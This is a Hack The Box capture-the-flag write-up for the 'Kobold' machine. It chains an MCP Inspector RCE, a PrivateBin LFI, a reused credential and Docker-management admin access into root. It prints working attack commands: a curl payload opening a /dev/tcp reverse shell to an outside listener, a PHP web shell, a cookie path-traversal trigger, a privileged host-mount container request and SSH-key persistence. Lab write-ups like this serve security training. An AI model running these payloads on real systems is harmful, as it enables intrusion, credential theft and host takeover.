# Kobold — HTB Writeup

**Target:** kobold.htb (10.129.245.50), HTB machine id 856
**OS:** Ubuntu Linux (OpenSSH 9.6p1 Ubuntu 3ubuntu13.15, nginx 1.24.0)
**Stack:** MCPJam Inspector (Node), PrivateBin 2.0.2 (PHP, containerized),
Arcane v1.13.0 (Go, Docker management platform, runs as root on the host),
Docker as the underlying container runtime tying the last two together

## Skills Required

- **Model Context Protocol (MCP) architecture** — what an MCP server config
  is and why letting a caller control the command a server spawns is
  dangerous by design, not just a coding bug. [MCP Specification (Model
  Context Protocol)](https://modelcontextprotocol.io/specification/2026-07-28)
- **Path traversal / local file inclusion via a client-controlled
  parameter** (here, a cookie value used to select a template file) —
  [Path Traversal (OWASP Foundation)](https://owasp.org/www-community/attacks/Path_Traversal)
- **Docker privileged containers and bind mounts as a root-equivalence
  primitive** — why admin on any platform that can create a privileged,
  arbitrarily-bind-mounted container is root on the host by design —
  [`docker container run` — Runtime privilege and Linux capabilities
  (Docker Docs)](https://docs.docker.com/reference/cli/docker/container/run/)
- **Reading a CVE's real patch diff against pinned source, not just an
  advisory summary** — [GHSA-2jv8-39rp-cqqr: Arcane unauthenticated proxy
  access to remote environments (GitHub Advisory
  Database)](https://github.com/getarcaneapp/arcane/security/advisories/GHSA-2jv8-39rp-cqqr)

## Recon

`nmap` showed a small surface: 22 (SSH), 80/443 (nginx, TLS wildcard cert
for `kobold.htb` / `*.kobold.htb` — vhost routing expected), and 3552 (a Go
`net/http` server, reached directly by IP:port rather than proxied through
80/443).

Vhost enumeration off the wildcard cert turned up two apps behind 443:

- `mcp.kobold.htb` — **MCPJam Inspector**, an MCP (Model Context Protocol)
  debugging tool. `/api/mcp/servers` and `/api/mcp/connect` both reachable
  with zero auth.
- `bin.kobold.htb` — **PrivateBin 2.0.2** (version confirmed via
  `privatebin.css/js?2.0.2` strings in page source), internally proxied to
  `bin.kobold.htb:8080`.

Port 3552 turned out to be **Arcane v1.13.0**, a Docker container-management
platform with a SvelteKit frontend — version pinned exactly via the
unauthenticated `/api/version` endpoint.

Version-matching against known CVEs gave three live leads plus one dead one:

1. **MCPJam Inspector ≤ 1.4.2** — unauthenticated RCE, [[CVE-2026-23744]].
   No version banner directly, but `/api/mcp/connect` accepting POST with
   zero auth matched the vulnerable pattern exactly.
2. **PrivateBin 2.0.2** — in the vulnerable range (≥1.7.7, <2.0.3) for the
   template-cookie LFI, [[CVE-2025-64714]]. Needs
   `templateselection = true` in `cfg/conf.php`, unconfirmed at recon time
   but plausible; usable as a standalone read primitive even without a
   write primitive for full RCE.
3. **Arcane v1.13.0** — checked for three CVEs:
   - `CVE-2026-23520` (authenticated command injection in the updater) —
     patched exactly at 1.13.0, not applicable.
   - [[CVE-2026-23944]] (environment-proxy auth bypass) — in the vulnerable
     range (fixed 1.13.2), and the vulnerable code path was independently
     confirmed reachable (non-`local` environment ids returned a distinct
     pre-auth 404 rather than the 401 that auth-gated paths return), but no
     second/remote environment was registered to actually proxy through —
     flagged as a strong lead for later, not a working exploit yet.
   - `CVE-2026-40242` (unauthenticated SSRF via `/api/templates/fetch`) —
     probed at recon time and wrongly written off as 404/not-present. This
     turned out to be a recon miss, corrected during privesc (see below).
   - Default creds `arcane`/`arcane-admin` tried against `/api/auth/login`
     — rejected, confirming the endpoint but that defaults had been
     rotated.

Ranked vector 1 (MCPJam RCE) as the highest-confidence, lowest-effort
foothold and went there first.

**Working theory heading into Foothold:** three plausible CVEs across three
different apps, but they're not equally cheap to prove. MCPJam's
unauthenticated `/api/mcp/connect` needs no preconditions at all; PrivateBin's
LFI depends on an unconfirmed config flag; Arcane's environment-proxy bug
needs a second registered environment that doesn't obviously exist yet. Start
with the cheapest one to test. And regardless of which CVE actually lands
first, `arcane.service` running as root is the real prize sitting in plain
sight — a Docker-management platform running as root makes admin-on-Arcane
the likely actual privesc target, independent of whether any of its own
CVEs turn out to be the way there.

## Foothold

This confirmed the working theory from Recon — the unauthenticated path
needing zero preconditions was in fact the fastest win. [[CVE-2026-23744]]
delivered exactly as advertised. MCPJam Inspector's
`POST /api/mcp/connect` takes a `serverConfig` object and spawns
`serverConfig.command`/`args` as a real child process with no
authentication and no input validation:

```bash
curl -sk -H "Host: mcp.kobold.htb" -H "Content-Type: application/json" \
  -X POST https://10.129.245.50/api/mcp/connect \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.46/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

A reverse shell landed immediately as `ben`, inside the Inspector's own
working directory — confirms the process spawned is the actual Inspector
service process (`mcp-jam.service`, `User=ben`). The API's own response
always reports a connection failure (`MCP error -32000: Connection closed`)
even when the command runs successfully, since the spawned process exits
before the MCP handshake completes — command execution has to be verified
by its side effects, not by the HTTP response.

Stabilized access by planting an SSH key rather than relying on the raw
`/dev/tcp` shell — no `authorized_keys` existed for `ben` yet:

```bash
mkdir -p /home/ben/.ssh && chmod 700 /home/ben/.ssh
echo "ssh-ed25519 AAAA... kobold-foothold" >> /home/ben/.ssh/authorized_keys
chmod 600 /home/ben/.ssh/authorized_keys
```

```
ssh -i ~/.ssh/kobold_ben ben@10.129.245.50 'id'
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

`ben` is **not** in the `docker` group, despite `/var/run/docker.sock`
(root:docker) existing on the box — no direct socket access from this
account. The `operator` group membership turned out to matter a lot more
than the missing `docker` group did.

`user.txt`: `affa47ba234d4a7418f3f8d528205036` (`/home/ben/user.txt`,
root:ben, mode 640).

Two things worth flagging from the box's systemd units, read via
`systemctl cat`:
- `arcane.service` runs `/root/arcane_linux_amd64` as **root**,
  `WorkingDirectory=/root`, with an `ENCRYPTION_KEY` env var set.
- A second Linux user, `alice` (uid 1002), also in `operator`.

Both fit the Recon-stage theory that Arcane admin was the real objective,
and both looked like strong privesc leads walking in — neither turned out
to be the actual mechanism for getting there (see Rabbit Holes below).

## Privesc

Standard local enumeration as `ben` came up completely empty: `sudo -n -l`
requires a password (no NOPASSWD entries), no non-stock SUID/SGID binaries,
no exploitable file capabilities, no writable cron jobs or `$PATH`
entries, no crontab for `ben`, empty `.bash_history`. `ps auxf` confirmed
three services (`mcp-jam.service` as `ben`, `arcane.service` as root,
`docker.service`) plus an unexplained root-owned loopback listener on
`127.0.0.1:37581` that never turned out to matter.

### `operator` → world-writable PrivateBin data → LFI → leaked DB cred → Arcane admin

`ben`'s `operator` group membership matters because `/privatebin-data`
(PrivateBin's bind-mounted data volume) is group-owned by `operator` —
and critically, `/privatebin-data/data/` itself is `drwxrwxrwx`, not
actually gated behind the group at all. That's a direct filesystem write
primitive with no upload vector needed:

```bash
ssh -i ~/.ssh/kobold_ben ben@10.129.245.50 "cat > /privatebin-data/data/pwn.php << 'EOF'
<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>'.shell_exec(\$_REQUEST['cmd']).'</pre>'; } ?>
EOF
chmod 777 /privatebin-data/data/pwn.php"
```

Triggered [[CVE-2025-64714]] via the `template` cookie against
`bin.kobold.htb`, traversing out of `tpl/` into `data/`:

```bash
curl -sk -H "Host: bin.kobold.htb" -b "template=../data/pwn" \
  --data-urlencode "cmd=id" -G "https://10.129.245.50/"
# uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

This lands **inside the PrivateBin container** (confirmed via `.dockerenv`
and an overlayfs root), not the host — so on its own it's not an
escalation over what `ben` already had. Its value was as a read primitive
into a file `ben` couldn't reach directly on the host:

```bash
curl -sk -H "Host: bin.kobold.htb" -b "template=../data/pwn" \
  --data-urlencode "cmd=cat /srv/cfg/conf.php" -G "https://10.129.245.50/"
```

`/srv/cfg` is PrivateBin's config, bind-mounted read-only from
`/privatebin-data/cfg` (`drwxr-x--- root:82` on the host — `ben` isn't in
gid 82, but the container process running as `nobody:www-data` shares that
numeric gid). `conf.php` contained a *disabled* (semicolon-commented)
`[model]` block for a legacy MySQL backend, left over from a "migrating to
loadbalancing" comment, with a password that was never rotated out even
though the block itself was dead code:

```
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

Tried this credential everywhere reachable. Failed against `alice`'s
Linux account (above) and against Arcane usernames `admin`/`administrator`/
`root`. Succeeded as Arcane username **`arcane`**:

```bash
curl -sk -X POST http://10.129.245.50:3552/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'
```

Returned a valid JWT with `"roles":["admin"]` — full admin over Arcane, the
app that runs as root on the host and controls the Docker daemon. This is
where the working theory from Recon paid off on its second half: Arcane
admin, not any of its own CVEs, was the real route to root — reached via a
completely unplanned mechanism (a leaked legacy DB credential from an
unrelated app), not any of the three CVE candidates identified at recon
time.

## Root

Confirmed via `GET /api/environments` (admin token) that only `id "0"`
("Local Docker") exists — this both closed off [[CVE-2026-23944]] for good
(above) and confirmed there's no remote environment to route through, only
Arcane's direct control of the host's own Docker daemon.

Admin on a Docker management platform with container-create rights is
root-equivalent by design, not by bug — wrote up the generic pattern as
[[docker-management-api-privesc]] since this is reusable well beyond this
one box. Listed cached images (no internet egress from the box, but two
images were already present: `mysql:latest` and
`privatebin/nginx-fpm-alpine:2.0.2`, the running PrivateBin image itself)
and used Arcane's container-create API to spin up a privileged container
with the entire host filesystem bind-mounted:

```bash
curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "http://10.129.245.50:3552/api/environments/0/containers" -d '{
    "name": "pwn-root-check",
    "image": "privatebin/nginx-fpm-alpine:2.0.2",
    "user": "0:0",
    "entrypoint": ["/bin/sh","-c"],
    "cmd": ["{ id; cat /host/root/root.txt; } > /host/tmp/pwn_out.txt 2>&1"],
    "hostConfig": {"binds": ["/:/host:rw"], "privileged": true}
  }'
```

Had to explicitly override `user: "0:0"` (the image defaults to
`65534:82`/nobody, which hits permission errors reading root-owned host
files even with `privileged: true`) and override `entrypoint` (the image's
baked-in `/etc/init.d/rc.local` entrypoint otherwise swallows the supplied
`cmd`). Arcane auto-starts newly created containers — no separate
`/start` call needed. There's no REST logs endpoint in Arcane's API (logs
are WebSocket-only), so output was redirected to a file under the
bind-mounted host root and read back over the existing `ben` SSH session:

```
ssh -i ~/.ssh/kobold_ben ben@10.129.245.50 'cat /tmp/pwn_out.txt'
uid=0(root) gid=0(root) groups=0(root)
a6501d4cc6d02ff2d2ef9a2dc4dbb940
```

Made it persistent by running a second one-shot privileged container to
plant the SSH public key into `/root/.ssh/authorized_keys` on the host:

```
ssh -i ~/.ssh/kobold_ben root@10.129.245.50 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
a6501d4cc6d02ff2d2ef9a2dc4dbb940
```

`root.txt`: `a6501d4cc6d02ff2d2ef9a2dc4dbb940`.

Cleaned up afterward: deleted all throwaway containers via Arcane's
`DELETE /api/environments/0/containers/{id}?force=true`, removed the
planted webshell (`/privatebin-data/data/pwn.php`) and the output files
under `/tmp`, and confirmed via the container list that only the
legitimate PrivateBin container remained running.

## Rabbit Holes

Two of these fit the Recon-stage theory that Arcane admin was the real
objective and looked like strong privesc leads walking in; neither turned
out to be the actual mechanism. The third was a plausible alternate path
that never got confirmed reachable.

### The Arcane `ENCRYPTION_KEY`

The key sitting in `arcane.service`'s environment
(`Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E=`) looked like the obvious
lead. Checked what it actually protects before assuming it was useful:
Arcane uses two separate secrets — `ENCRYPTION_KEY` encrypts *at-rest*
secrets in its own DB (registry creds, git tokens, OIDC secrets), while a
**separate** `JWT_SECRET` env var signs session JWTs. Only
`ENCRYPTION_KEY` was set in the unit file; no `JWT_SECRET` or Arcane `.env`
was found readable anywhere on disk (`/root` itself was `Permission
denied` for `ben`, not just its contents). So this key alone can't forge
an admin session, and it doesn't decrypt anything reachable without
privesc already in hand. Ruled out standalone — it became moot once admin
access was obtained a different way (above).

### Confirmed real, but unreachable: [[CVE-2026-23944]]

Pulled the actual fix commit
([`2008e1b`](https://github.com/getarcaneapp/arcane/commit/2008e1b93b25d0c4c3fff3af07843766231614eb))
to understand the real bug rather than just cite the advisory: pre-1.13.2,
`environment_middleware.go`'s proxy path resolved the target environment
and — if it was a registered remote/agent-paired environment — forwarded
the request with the manager's own stored agent token attached *before*
checking whether the caller was authenticated at all. The fix adds an
`authValidator` check that now runs first and returns 401 before any
environment lookup happens.

On-target behavior still matched the vulnerable pattern exactly: hitting
`/api/environments/<any-id>/containers` for a non-existent id returns a
pre-auth `{"error":"Environment not found"}` with zero auth required —
the buggy ordering genuinely is still present in this build. But once
Arcane admin access was obtained (above), `GET /api/environments` showed
this instance has exactly **one** environment, `id "0"`, "Local Docker" —
no remote/agent environment registered to proxy through. `GET
/api/environments/0/containers` unauthenticated returns a proper `401`,
confirming the local environment doesn't even hit the vulnerable code
path. The vulnerability is real and reachable; there's just nothing behind
it to abuse on this specific instance. Confirmed dead, not just
unconfirmed.

While re-checking Arcane's CVEs at this stage, also caught a recon mistake
worth naming as a near-miss rather than a clean dead end: `CVE-2026-40242`
(unauthenticated SSRF via `/api/templates/fetch`) had been wrongly marked
404 during recon. This overturned the Recon-stage conclusion that the
endpoint didn't exist — it was a routing/path mistake during initial
testing, not a real absence. Retested with the correct path and got a live
`422` demanding a `url` parameter — the endpoint is present and
unauthenticated. It only fetches `http`/`https` (`file://` is explicitly
rejected) and only reflects errors, not response bodies, on non-JSON
targets — but that's still enough for unauthenticated internal port
scanning. Used it to confirm reachability of loopback services (8080/
PrivateBin, 6274/MCPJam-internal, 3552/Arcane itself, and the mystery
37581 listener). It wasn't what delivered root here, but it's a live,
useful SSRF primitive on this instance worth remembering for a future box
where it's the only way in.

### `alice` and the `docker` group

`alice` (uid 1002) is in `operator` **and** `docker`
(`groups=1002(alice),37(operator),111(docker)`) — direct socket access if
her account were reachable. `/home/alice` wasn't browsable by `ben`
(permission denied on the directory itself), and no SSH key, sudo path, or
other direct credential existed for her. Once the legacy DB credential
leaked (above), tried it against her actual Linux login both via `su
alice` and directly over SSH — both failed with "Authentication failure."
Ruled out as a direct path. Root was eventually reached by a different
route that lands on the same practical outcome (Docker-mediated root) her
group membership would have given, without ever touching her account.
Most likely an alternate/red-herring path the box intended.

## Skills Learned

- Exploiting an MCP server's unauthenticated `serverConfig.command`
  execution to spawn an arbitrary process ([[CVE-2026-23744]])
- PrivateBin template-cookie path traversal ([[CVE-2025-64714]]) used as a
  cross-container read primitive, not just a same-host LFI
- Distinguishing "vulnerable code path present" from "actually exploitable
  in this deployment" via real patch-diff analysis, not just an advisory
  summary ([[CVE-2026-23944]])
- Recovering a live, un-rotated credential from a disabled
  (semicolon-commented) legacy config block
- Testing a recovered credential across every distinct login surface on a
  box, including ones on a completely unrelated tech stack
- Recognizing admin on a Docker-management platform as root-equivalent by
  design, not a bug to go hunting for
- Overriding a Docker image's default non-root user and baked-in
  entrypoint through a container-create API to get real root execution
- Using an unauthenticated SSRF primitive for internal service/port
  reachability mapping
- Re-testing a recon-stage "not present" conclusion once more context is
  available, rather than treating it as permanently closed

## Lessons Learned

- **Admin on a container-management platform is root, full stop.** Any
  API that supports privileged-container creation with arbitrary bind
  mounts is a straight line to the host the moment you're authenticated —
  don't go hunting for a "real" escalation bug once you've got that; it's
  already the escalation. Generalized as [[docker-management-api-privesc]].
- **Commented-out config blocks are not dead credentials.** The winning
  password here sat in a disabled, semicolon-commented `[model]` section
  left over from an infrastructure migration — nobody thought to rotate it
  because the code path referencing it was "off." Treat every credential
  in a config file as live until proven otherwise, active code path or not.
- **Credential reuse across unrelated apps is still the highest-yield
  privesc technique available**, even on a box stacked with real,
  version-pinned CVEs. A MySQL password leaked from a PHP pastebin clone
  turned out to be the admin login for a completely separate Go-based
  Docker management platform — no technical relationship between the two
  apps beyond a human reusing a password.
- **A strong-looking lead still needs empirical verification, not just
  theoretical applicability.** Both the `ENCRYPTION_KEY` and
  [[CVE-2026-23944]] were genuine, both were investigated with real
  patch-diff analysis rather than taken on faith from the advisory, and
  both correctly dead-ended once tested against live behavior instead of
  being left as untested assumptions: `ENCRYPTION_KEY` decrypts a store
  that isn't reachable without privesc already in hand (chicken/egg), and
  the environment-proxy bug is unmistakably still present in the binary
  but has nothing to proxy to on a single-environment Arcane instance.
  "Looks exploitable in code" and "is exploitable in this deployment" are
  different claims — verify both.
- **Group membership can be a red herring.** `alice`'s `docker` group
  membership looked like the obvious intended path and wasn't — the
  credential that actually mattered had nothing to do with her account.
  Don't over-invest in the most visually appealing lead before ruling out
  cheaper ones.
- **A dead-end CVE probe from recon is worth re-checking once you have
  more context.** `CVE-2026-40242` (Arcane SSRF) was wrongly written off
  as not-present during initial recon (wrong assumption about the route
  returning 404) and turned out to be live and unauthenticated once
  retested during privesc — it wasn't the path to root here, but it would
  have been a perfectly good unauthenticated internal-network-mapping
  primitive on a box where the direct paths were closed off.
- **World-writable directories inside a bind-mounted app data volume are
  a bigger risk than the group ACL suggests.** The `operator` group ACL on
  `/privatebin-data` looked like the access control; the actual exposure
  was that `data/` underneath it was `drwxrwxrwx` regardless of group,
  handing anyone on the box a write primitive straight into an LFI's blast
  radius with no upload feature required.
